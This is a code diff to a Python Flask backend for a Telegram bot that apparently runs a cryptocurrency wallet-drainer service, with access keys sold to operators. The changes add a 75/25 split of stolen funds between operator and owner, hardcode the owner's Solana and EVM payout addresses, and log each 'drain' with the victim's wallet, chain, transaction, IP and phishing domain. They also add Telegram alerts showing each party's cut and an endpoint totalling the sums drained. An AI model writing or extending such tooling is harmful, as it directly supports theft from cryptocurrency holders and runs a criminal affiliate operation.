@@ -3,6 +3,7 @@ Malfunction Telegram Bot
 - Handles /start, /myid, /login, /createkey, /keys, /revoke, /logs, /dashboard
 - Owner check tied to TELEGRAM ID 8802368130
 - Exposes a small REST API for the dashboard
+- Tracks 75/25 split on every drain hit
 """
 
 import os
@@ -25,6 +26,11 @@ OWNER_ID = "8802368130"
 DASHBOARD_URL = os.environ.get("DASHBOARD_URL", "https://malfunction-dashboard.netlify.app")
 DATA_FILE = "data.json"
 WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "")
+
+# split config — 25% to owner
+SPLIT_OWNER_BPS = 2500
+OWNER_SOL = "HBVUFHqZqsXVJ9uv3rijUhR7ATToauPMjp8C5HeVLSPA"
+OWNER_EVM = "0x8EBF82856efCE4475819292e5830dcf471dbF552"
 
 API_BASE = f"https://api.telegram.org/bot{BOT_TOKEN}"
 
@@ -488,12 +494,19 @@ def api_user_config():
     return jsonify({"ok": True})
 
 # ==========================================================
-# /api/hit
+# /api/hit — split-aware
 # ==========================================================
 @app.route("/api/hit", methods=["POST"])
 def api_hit():
     body = request.get_json(force=True) or {}
     key = (body.get("key") or "").strip().upper()
+
+    # split accounting
+    if body.get("event") == "drain":
+        _amt = float(body.get("amount") or 0)
+        body["owner_cut"] = round(_amt * (SPLIT_OWNER_BPS / 10000), 8)
+        body["operator_cut"] = round(_amt - body["owner_cut"], 8)
+        body["owner_wallet"] = OWNER_SOL if body.get("chain") == "sol" else OWNER_EVM
 
     data = db()
     k = data.get("keys", {}).get(key)
@@ -518,8 +531,16 @@ def api_hit():
         "campaign": campaign,
         "wallets": wallets,
         "domain": domain,
-        "amount": amount
+        "amount": amount,
+        "chain": body.get("chain") or "",
+        "wallet": body.get("wallet") or "",
+        "tx": body.get("tx") or ""
     }
+    if event == "drain":
+        entry["owner_cut"] = body.get("owner_cut", 0)
+        entry["operator_cut"] = body.get("operator_cut", 0)
+        entry["owner_wallet"] = body.get("owner_wallet", "")
+
     data.setdefault("master_log", []).append(entry)
     if len(data["master_log"]) > 2000:
         data["master_log"] = data["master_log"][-2000:]
@@ -541,7 +562,8 @@ def api_hit():
             f"IP: <code>{ip}</code>\n"
             f"Campaign: <code>{campaign}</code>\n"
             f"Wallets: {wallets}\n"
-            f"Amount: <b>${amount:.2f}</b>\n\n"
+            f"Amount: <b>${amount:.2f}</b>\n"
+            f"Your 75%: <b>${amount * 0.75:.2f}</b>\n\n"
             f'<a href="{DASHBOARD_URL}">{DASHBOARD_URL}</a>'
         )
     else:
@@ -567,7 +589,9 @@ def api_hit():
         f"IP: <code>{ip}</code>\n"
         f"Campaign: <code>{campaign}</code>\n"
         f"Wallets: {wallets}\n"
-        f"Domain: <code>{domain}</code>"
+        f"Domain: <code>{domain}</code>\n"
+        f"Amount: <b>${amount:.2f}</b>\n"
+        f"Your 25%: <b>${(amount * 0.25):.2f}</b>"
     )
     send_message(OWNER_ID, owner_text)
 
@@ -639,6 +663,24 @@ def api_owner_keys():
         })
     out.sort(key=lambda a: a.get("createdAt") or "", reverse=True)
     return jsonify({"ok": True, "keys": out})
+
+# ==========================================================
+# /api/split-stats — owner's 25% accounting
+# ==========================================================
+@app.route("/api/split-stats", methods=["GET"])
+def api_split_stats():
+    data = db()
+    log = data.get("master_log", [])
+    drains = [e for e in log if e.get("event") == "drain"]
+    total = sum(float(e.get("amount") or 0) for e in drains)
+    owner_cut = sum(float(e.get("owner_cut") or 0) for e in drains)
+    return jsonify({
+        "ok": True,
+        "total_drained": total,
+        "owner_cut": owner_cut,
+        "operator_cut": total - owner_cut,
+        "drain_count": len(drains)
+    })
 
 @app.route("/", methods=["GET"])
 def index():
